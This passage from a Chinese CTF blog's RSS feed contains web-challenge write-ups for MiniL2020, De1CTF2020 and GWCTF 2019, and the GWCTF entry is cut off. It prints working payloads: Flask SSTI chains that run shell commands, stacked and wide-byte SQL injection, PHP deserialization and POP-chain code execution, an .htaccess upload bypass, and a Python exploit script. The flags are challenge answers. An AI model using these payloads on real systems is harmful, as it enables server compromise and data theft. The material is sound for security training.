&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 &lt;code&gt;imgToBase64()&lt;/code&gt; 实现的是将目标文件转化成base64格式。而我们只需要将 &lt;code&gt;$img_file&lt;/code&gt; 改成 &lt;code&gt;/flag.php&lt;/code&gt; 即可。&lt;/p&gt;
&lt;p&gt;访问 &lt;code&gt;http://ip/index.php?r=User/Index&amp;amp;img_file=/../flag.php&lt;/code&gt; 即可获得flag的base64&lt;/p&gt;
&lt;p&gt;flag{fd2a64c6-8bd5-48c8-8ed7-8b5974dfaddf}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MiniL2020_web_wp</title>
        <link>https://anthem-whisper.github.io/p/minil2020_web_wp/</link>
        <pubDate>Sun, 10 May 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/minil2020_web_wp/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170521.png" alt="Featured image of post MiniL2020_web_wp" /&gt;&lt;p&gt;西电校赛，难度适中，本人内鬼选手，看了下题。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;id_wife&#34;&gt;id_wife&lt;/h3&gt;
&lt;p&gt;考点：堆叠注入&lt;/p&gt;
&lt;p&gt;不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生&lt;/p&gt;
&lt;p&gt;测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/2020i%e6%98%a5%e7%a7%8b%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b_web_wp/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;新春战疫的一道sqli&lt;/a&gt;，Handler一把梭&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}&lt;/p&gt;
&lt;h3 id=&#34;personal_ip_query&#34;&gt;Personal_IP_Query&lt;/h3&gt;
&lt;p&gt;考察：flaskSSTI，绕过下划线、单双引号。&lt;/p&gt;
&lt;p&gt;学习链接&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt;&lt;a class=&#34;link&#34; href=&#34;http://flag0.com/2018/11/11/%e6%b5%85%e6%9e%90SSTI-python%e6%b2%99%e7%9b%92%e7%bb%95%e8%bf%87/#%e8%bf%87%e6%bb%a4%e5%8f%8c%e4%b8%8b%e5%88%92%e7%ba%bf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;flag0师傅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt;&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/fea23f17d497&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;byc_404师傅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI&lt;/p&gt;
&lt;p&gt;输入 &lt;code&gt;{{2+2}}&lt;/code&gt; 之后回显的 &lt;code&gt;4&lt;/code&gt; 实锤。&lt;/p&gt;
&lt;p&gt;Fuzz，过滤了下划线、单双引号、没有过滤中括号&lt;/p&gt;
&lt;p&gt;最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出&lt;/p&gt;
&lt;p&gt;在class中寻找模块exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#python 3
import re
str = &#39;&#39;&#39;

（回显信息）

&#39;&#39;&#39;

list = re.split(&#39;,&#39;, str)

for i in range(0, len(list)):
      if &#39;catch_warnings&#39; in list[i]:
            print(i)
            break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;playload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__
&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat+/flag&#39;).read()

X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()
|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)
|attr(request.args.x4)(request.args.x8)(request.args.x9)}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;复现时补充：&lt;/p&gt;
&lt;p&gt;我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}
//回显：Your IP: &amp;lt;class &#39;os._wrap_close&#39;&amp;gt;

GET ：?class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__&amp;amp;init=__init__&amp;amp;globals=__globals
__&amp;amp;builtins=__builtins__&amp;amp;eval=eval&amp;amp;cmd=__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;cat+/flag&amp;quot;).read()

x-forwarded-for: {{ [][request.args.class][request.args.mro][1][request.args.subclasses]()
[127][request.args.init][request.args.globals][request.args.builtins][request.args.eval]
(request.args.cmd) }}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ezbypass&#34;&gt;ezbypass&lt;/h3&gt;
&lt;p&gt;考察：过滤逗号等号的无列名注入，PHP反序列化字符逃逸&lt;/p&gt;
&lt;p&gt;这道题两个步骤，第一层是sqli，第二层是反序列化字符串逃逸&lt;/p&gt;
&lt;p&gt;第一层我做的非预期，fuzz过后，发现ban了逗号、等号、or&lt;/p&gt;
&lt;p&gt;然后发现是双引号闭合&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;logname=1&amp;quot;||1 limit 1 offset 3#&amp;amp;logpass=1
回显：alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问 &lt;code&gt;ip/flag327a6c4304a/&lt;/code&gt; ，来到第二关：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
include (&#39;flag.php&#39;);
error_reporting(0);
function filter($payload){
    $key = array(&#39;php&#39;,&#39;flag&#39;,&#39;xdsec&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$key).&#39;/i&#39;;
    return preg_replace($filter,&#39;hack!!!!&#39;,$payload);
}

$payload=$_GET[&#39;payload&#39;];
$fuck[&#39;mini&#39;]=&#39;nb666&#39;;
$fuck[&#39;V0n&#39;]=&#39;no_girlfriend&#39;;

if(isset($payload)) {
    if (strpos($payload, &#39;php&#39;) &amp;gt;=0 || strpos($payload, &#39;flag&#39;)&amp;gt;=0 || strpos($payload, &#39;xdsec&#39;)&amp;gt;=0) {
        $fuck[&#39;mini&#39;]=$payload;
        var_dump(filter(serialize($fuck)));
        $fuck=unserialize(filter(serialize($fuck)));
        var_dump($fuck);
        if ($fuck[&#39;V0n&#39;] === &#39;has_girlfriend&#39;) {
            echo $flag;
        } else {
            echo &#39;fuck_no_girlfriend!!!&#39;;
        }
    }else{
        echo &#39;fuck_no_key!!!&#39;;
    }
}else{
    highlight_file(__FILE__);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题目会把序列化之后的 &lt;code&gt;php&lt;/code&gt; &lt;code&gt;flag&lt;/code&gt; &lt;code&gt;xdsec&lt;/code&gt; 关键字替换为 &lt;code&gt;hack!!!!&lt;/code&gt; 然后进行反序列化操作再赋值给 &lt;code&gt;$fuck&lt;/code&gt; 我就直接想到了&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/fakephp%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安恒2020.4月赛&lt;/a&gt;的web1，越看越像字符逃逸，不过有区别的是这里是字符变多导致后面的逃逸，不过思路一样：逃逸、闭合&lt;/p&gt;
&lt;p&gt;我们的 &lt;code&gt;php&lt;/code&gt; 关键字被替换为 &lt;code&gt;hack!!!!&lt;/code&gt; 之后，从3个字符变成了5个字符，但是反序列化的时候由于 &lt;code&gt;s:3&lt;/code&gt; 的存在，这个值仍然会被当作三个字符来处理，我们可以看到下图替换之后由于左边选中部分不一致，造成了反序列化后出现 &lt;code&gt;bool(false)&lt;/code&gt; 的结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170547.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接看payload就懂：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?payload=phpphpphpphpphpphpphp&amp;quot;;s:3:&amp;quot;V0n&amp;quot;;s:14:&amp;quot;has_girlfriend&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170556.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我们输入了56了字符， &lt;code&gt;phpphpphpphpphpphpphp&lt;/code&gt; 被替换之后正好是56个字符，我们后面的字符就逃逸了，这个时候给他一闭和，flag就来了&lt;/p&gt;
&lt;p&gt;minil{7f3ea366-f5ab-463c-b511-af63d6dc7715}&lt;/p&gt;
&lt;h3 id=&#34;lets_play_dolls&#34;&gt;Let&amp;rsquo;s_Play_Dolls&lt;/h3&gt;
&lt;p&gt;考点：PHP无参数RCE、pop链&lt;/p&gt;
&lt;p&gt;开题送码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;lt;?php
error_reporting(0);
if(isset($_GET[&#39;a&#39;])){
    unserialize($_GET[&#39;a&#39;]);
}
else{
    highlight_file(__FILE__);
}

class foo1{
    public $var=&#39;&#39;;
    function __construct(){
        $this-&amp;gt;var=&#39;phpinfo();&#39;;
    }
    function execute(){
        if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $this-&amp;gt;var)) { 
            if(!preg_match(&#39;/header|bin|hex|oct|dec|na|eval|exec|system|pass/i&#39;,$this-&amp;gt;var)){
                eval($this-&amp;gt;var);
            }  
            else{
                die(&amp;quot;hacked!&amp;quot;);
            }  
        }

    }
    function __wakeup(){
        $this-&amp;gt;var=&amp;quot;phpinfo();&amp;quot;;
    }
    function __desctuct(){
        echo &#39;&amp;lt;br&amp;gt;desctuct foo1&amp;lt;/br&amp;gt;&#39;;
    }
}
class foo2{
    public $var;
    public $obj;
    function __construct(){
        $this-&amp;gt;var=&#39;hi&#39;;
        $this-&amp;gt;obj=null;
    }
    function __toString(){
        $this-&amp;gt;obj-&amp;gt;execute();
        return $this-&amp;gt;var;
    }
    function __desctuct(){
        echo &#39;&amp;lt;br&amp;gt;desctuct foo2&amp;lt;/br&amp;gt;&#39;;
    }
}
class foo3{
    public $var;
    function __construct(){
        $this-&amp;gt;var=&amp;quot;index.php&amp;quot;;
    }
    function __destruct(){
        if(file_exists($this-&amp;gt;var)){
            echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;.$this-&amp;gt;var.&amp;quot;exist&amp;lt;/br&amp;gt;&amp;quot;;
        }
        echo &amp;quot;&amp;lt;br&amp;gt;desctuct foo3&amp;lt;/br&amp;gt;&amp;quot;;
    }
    function execute(){
        print(&amp;quot;hi&amp;quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大概是这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pop = new foo3;
$pop-&amp;gt;var = new foo2;//触发__toString()，调用execute()
$pop-&amp;gt;var-&amp;gt;obj = new foo1;//调用foo1的execute()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功调用foo1的execute()函数之后就需要我们绕正则，这里是无参数RCE， &lt;code&gt;if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $this-&amp;gt;var))&lt;/code&gt; 限制了参数；&lt;/p&gt;
&lt;p&gt;查了一下?R，PHP manual中这样说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;”首先，它匹配一个左括号。 然后它匹配任意数量的非括号字符序列或一个模式自身的递归匹配(比如， 一个正确的括号子串)，最终，匹配一个右括号。“&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大概是这个样子 &lt;code&gt;XXXX(XXXX(XXXX()))&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\W等价于[^A-Za-z0-9_]
+括号匹配\( ...... \)
+括号中间是XXXX(XXXX(XXXX()))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;意思是我们可以 &lt;code&gt;a();&lt;/code&gt; &lt;code&gt;a(a());&lt;/code&gt; 但是不能 &lt;code&gt;a(&#39;1&#39;);&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;需要我们进行不带参数的RCE，这里&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/wangtanzhi/p/12311239.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;王叹之师傅&lt;/a&gt;讲的很好，基本就是那几个函数换着用，这里直接上playload；&lt;/p&gt;
&lt;p&gt;把foo1的var属性改为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;print_r(array_reverse(scandir(current(localeconv()))));
返回值：
Array ( [0] =&amp;gt; youCanGet1tmaybe [1] =&amp;gt; index.php [2] =&amp;gt; .. [3] =&amp;gt; . )


print_r(scandir(next(scandir(current(localeconv())))));
返回值：
Array ( [0] =&amp;gt; . [1] =&amp;gt; .. [2] =&amp;gt; html ) 
发现不是在上级目录，应该是读取youCanGet1tmaybe文件


print_r(readfile(end(scandir(current(localeconv())))));
返回值：
minil{af22c569-6114-44c6-8c8c-4b561cf7ac7b}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意： &lt;code&gt;echo serialize($pop)之后&lt;/code&gt;，需要绕过 &lt;code&gt;__wakeup()&lt;/code&gt; 才行。&lt;/p&gt;
&lt;h3 id=&#34;are-you-reclu3e&#34;&gt;are you reclu3e?&lt;/h3&gt;
&lt;p&gt;考点：vim文件恢复、宽字节注入、反序列化&lt;/p&gt;
&lt;p&gt;其实宽字节一开始就测出来了。。。
只不过我以为是要到表里面去注什么东西，结果是只需要登陆就可以。。。&lt;/p&gt;
&lt;p&gt;根据放出的hint，提示vim，马上想到.swp文件，login和index的全部整下来恢复&lt;/p&gt;
&lt;p&gt;在login.php中发现GBK字样，实锤宽字节注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=reclu3e%df&#39; union select 1,1#&amp;amp;password=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;登录之后我们就有了session，可以GET传入p让他反序列化&lt;/p&gt;
&lt;p&gt;根据网鼎的web1，PHP7.1+的版本，反序列化的时候不会对属性类型进⾏特别的处理&lt;/p&gt;
&lt;p&gt;所以我们可以直接把他改成public来打：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    include &amp;quot;flag.php&amp;quot;;//$flag=&amp;quot;minilctf{****}&amp;quot;;
    session_start();
    if (empty($_SESSION[&#39;uid&#39;])) {
        include &amp;quot;loginForm.html&amp;quot;;
    }
    else{
        echo &#39;&amp;lt;h1&amp;gt;Hello, reclu3e!&amp;lt;/h1&amp;gt;&#39;;
        $p=unserialize(isset($_GET[&amp;quot;p&amp;quot;])?$_GET[&amp;quot;p&amp;quot;]:&amp;quot;&amp;quot;);
    }
?&amp;gt;
&amp;lt;?php
class person{
    public $name=&#39;&#39;;
    public $age=0;
    public $weight=0;
    public $height=0;
    public $serialize=&#39;&amp;quot;;phpinfo();$s=&amp;quot;&#39;;
    public function __wakeup(){
        if(is_numeric($this-&amp;gt;serialize)){
            $this-&amp;gt;serialize++;
        }
    }
    public function __destruct(){
        @eval(&#39;$s=&amp;quot;&#39;.$this-&amp;gt;serialize.&#39;&amp;quot;;&#39;);
    }
}

$p = new person();
echo serialize($p);
//O:6:&amp;quot;person&amp;quot;:5:{s:4:&amp;quot;name&amp;quot;;s:0:&amp;quot;&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:0;s:6:&amp;quot;weight&amp;quot;;
i:0;s:6:&amp;quot;height&amp;quot;;i:0;s:9:&amp;quot;serialize&amp;quot;;s:16:&amp;quot;&amp;quot;;phpinfo();$s=&amp;quot;&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag就在PHPINFO里面&lt;/p&gt;
&lt;p&gt;其实这是一道简单题，之前我就测出来宽字节，不过应该是information_schema里面的列名被删了，
我以为是要注密码来登录，结果没想到。。然后反序列化也简单，至于后来给了hint之后解出仍然这
么少，可能就是本题的槽点之一。&lt;/p&gt;
&lt;p&gt;minil{22dac17a-b2e6-41c7-b969-5b1687fc73e1}&lt;/p&gt;
&lt;h3 id=&#34;p&#34;&gt;p&lt;/h3&gt;
&lt;p&gt;考点：反序列化、RCE绕过&lt;/p&gt;
&lt;p&gt;&lt;del&gt;听说和CTFshow的红包题第二弹几乎差不多，当时没做，不过我看了wp之后发现我的操作几乎&lt;/del&gt;
&lt;del&gt;一毛一样，不知道为什么没出。日后来填坑&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;md，不知道为啥，之前我自己构造了一个文件上传表单，然后用bp的intruder发包，费力不讨好，死活弄不出来。&lt;/p&gt;
&lt;p&gt;后来看了@blackwatch师傅的wp之后，直接起一个几行代码的python就可以的。。。。&lt;/p&gt;
&lt;p&gt;被自己菜哭，不多BB，exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
import base64

url = &#39;http://2c0b5cfcdee39a9fb6e7f5789943ca90.challenge.mini.lctf.online:1080/&#39;
git = &#39;O:6:&amp;quot;github&amp;quot;:2:{s:3:&amp;quot;cmd&amp;quot;;s:26:&amp;quot;?&amp;gt;&amp;lt;?=`. /??p/p?p??????`;?&amp;gt;&amp;quot;;}&#39;
git = base64.b64encode(git.encode()).decode()
cookies = {&#39;git&#39;: git}
files = {&#39;file&#39;: &#39;#!/bin/sh\ncat /* | grep &amp;quot;minil&amp;quot;\n&#39;}
a = requests.post(url, files=files, cookies=cookies)
print(a.text)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;minil{7da6b052-6630-40d8-9e7a-ccd5ff098871}&lt;/p&gt;
&lt;h3 id=&#34;include&#34;&gt;include&lt;/h3&gt;
&lt;p&gt;考点：PHP语言逻辑、WebDav协议绕过RFI限制&lt;/p&gt;
&lt;p&gt;不想做。。日后填坑&lt;/p&gt;
</description>
        </item>
        <item>
        <title>De1CTF2020_check in</title>
        <link>https://anthem-whisper.github.io/p/de1ctf2020_check-in/</link>
        <pubDate>Mon, 04 May 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/de1ctf2020_check-in/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170416.png" alt="Featured image of post De1CTF2020_check in" /&gt;&lt;p&gt;本次De1CTF是XCTF的第一场分站赛，不但吸引了国内许许多多的战队，还有非常多的国外的战队，据说前26名一半都是国外的。当然比赛题目也是非常的难，感觉自己在这种大比赛上面还是不能发挥什么作用。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;check-in&#34;&gt;check in&lt;/h3&gt;
&lt;p&gt;打开就是一个经典的文件上传页面，上传一个普通的图片马，页面回显：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;perl|pyth|ph|auto|curl|base|&amp;gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;文件内容被ban了这些，&lt;/p&gt;
&lt;p&gt;随后尝试了一些文件名称，只要文件名带&lt;code&gt;ph、html、.user.ini&lt;/code&gt;之类的都会直接返回filename error&lt;/p&gt;
&lt;p&gt;不过这么多东西都被ban了，唯独 &lt;code&gt;.htaccess&lt;/code&gt; 没有被ban。&lt;/p&gt;
&lt;p&gt;不过这个我开局就尝试了，但是没有发现什么姿势。&lt;/p&gt;
&lt;h4 id=&#34;关于-htaccess-几种姿势&#34;&gt;关于 .htaccess 几种姿势：&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;将特定文件作为php解析，用作后门。&lt;/li&gt;
&lt;li&gt;PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门（对于CGI/FastCGI模式 PHP 5.3.0 以上版本，还可以使用 在目录下创建.user.ini文件 。来引入该参数）&lt;/li&gt;
&lt;li&gt;CGI启动方式的RCE利用姿势&lt;/li&gt;
&lt;li&gt;FastCGI启动方式的RCE利用姿势&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://skysec.top/2017/09/06/%e6%9c%89%e8%b6%a3%e7%9a%84-htaccess/#Tokyo-Westerns-MMA-CTF-2nd-2016%e5%ba%94%e7%94%a8&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;重定向&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这道题ban掉了ph关键字之后，（1）中的方法看似不可以用，实则另有玄机。&lt;/p&gt;
&lt;p&gt;在XNUCA2019中，一道web题目ezphp的非预期解中，利用到了 &lt;code&gt;\&lt;/code&gt; 拼接 &lt;code&gt;.htaccess&lt;/code&gt; 文件中换行的内容，当时一种是为了利用第一行的 &lt;code&gt;#&lt;/code&gt; 符号拼接第二行的垃圾数据来达到注释垃圾数据的目的，另一种也是 &lt;code&gt;\&lt;/code&gt; 拼接绕过关键字过滤。具体可以参看&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/6111&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;XNUCA2019 ez系列web题解&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;https://evi0s.com/2019/08/30/x-nuca-2019-web-wp/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;X-NUCA 2019 Web WP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文件名 &lt;code&gt;.htaccess&lt;/code&gt;，MIME改成 &lt;code&gt;image/jpg&lt;/code&gt; ，文件内容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-p\
hp .jpg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170428.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那么我们通过\来拼接绕过了ph关键字之后，我们可以发现我们上传的jpg文件不再是无法查看的情况：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170439.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;第二个点，PHPecho短标签。&lt;/p&gt;
&lt;p&gt;过滤了 &lt;code&gt;&amp;gt;&lt;/code&gt; 和 &lt;code&gt;ph&lt;/code&gt; 的情况下， &lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt; 和 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 这种被通杀了，参考网上的&lt;a class=&#34;link&#34; href=&#34;https://wp.hellocode.name/?p=470&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;一篇文章&lt;/a&gt;：&lt;/p&gt;
&lt;h4 id=&#34;php-的四种标签写法&#34;&gt;PHP 的四种标签写法&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php echo 1; ?&amp;gt; //正常写法
&amp;lt;? echo 1; ?&amp;gt; //短标签写法，5.4 起 &amp;lt;?= &#39;hello&#39;; === &amp;lt;? echo &#39;hello&#39;;
&amp;lt;% echo 1; %&amp;gt; //asp 风格写法
&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt; echo 1; &amp;lt;/script&amp;gt; //长标签写法
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不同版本的区别&lt;/p&gt;
&lt;p&gt;第 1 种是正常写法，没什么可说的。&lt;/p&gt;
&lt;p&gt;第 2 种，需要 php.ini 配置文件中的指令 &lt;code&gt;short_open_tag&lt;/code&gt; 打开后才可用，或者在 PHP 编译时加入了 &lt;code&gt;--enable-short-tags&lt;/code&gt; 选项。自 PHP5.4 起，短格式的 echo 标记 &lt;code&gt;&amp;lt;?=&lt;/code&gt; 总会被识别并且合法，而不管 &lt;code&gt;short_open_tag&lt;/code&gt; 的设置是什么。&lt;/p&gt;
&lt;p&gt;第 3 种，不推荐写法，为了 asp 程序员学习 php 所添加的语法糖写法。需要通过 &lt;code&gt;php.ini&lt;/code&gt; 配置文件中的指令 &lt;code&gt;asp_tags&lt;/code&gt; 打开后才可用。&lt;/p&gt;
&lt;p&gt;第 4 种，在 php7.0 后已经不解析了。&lt;/p&gt;
&lt;p&gt;那就直接ojbk：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170456.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GWCTF 2019 复现</title>
        <link>https://anthem-whisper.github.io/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/</link>
        <pubDate>Thu, 30 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/</guid>
        <description>&lt;p&gt;之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;你的名字httpsbuuojcnchallengesgwctf202019你的名字&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GWCTF%202019]%e4%bd%a0%e7%9a%84%e5%90%8d%e5%ad%97&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;你的名字&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：flaskSSTI、绕过&lt;code&gt;{{}}&lt;/code&gt;过滤、黑名单过滤逻辑错误&lt;/p&gt;
&lt;p&gt;很详细的SSTI&amp;raquo;：https://xz.aliyun.com/t/6885#toc-4&lt;/p&gt;
&lt;p&gt;SSTIbypass姿势&amp;raquo;&lt;a href=&#34;https://p0sec.net/index.php/archives/120/&#34;&gt;https://p0sec.net/index.php/archives/120/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&amp;raquo;&lt;a class=&#34;link&#34; href=&#34;http://ggb0n.cool/2020/03/04/GWCTF2019%e5%a4%8d%e7%8e%b0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ggb0n&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。&lt;/p&gt;
&lt;p&gt;尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 ”&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170318.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；&lt;/p&gt;
&lt;p&gt;但是可以通过 &lt;code&gt;{%%}&lt;/code&gt; 类似的方式来进行注入，尝试 &lt;code&gt;{%if 1%}1{% endif%}&lt;/code&gt; ，发现服务器直接给出500错误。。。判断可能有什么过滤&lt;/p&gt;
&lt;p&gt;直接输入if，返回结果是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hello !
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。&lt;/p&gt;
&lt;p&gt;参考了师傅写的wp，fuzz出来的过滤可能是这个样子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,
                 &#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,
                 &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, 
                 &#39;func_globals&#39;, &#39;config&#39;]
for no in blacklist:
    while True:
        if no in s:
            s = s.replace(no, &#39;&#39;)
        else:
            break
return s
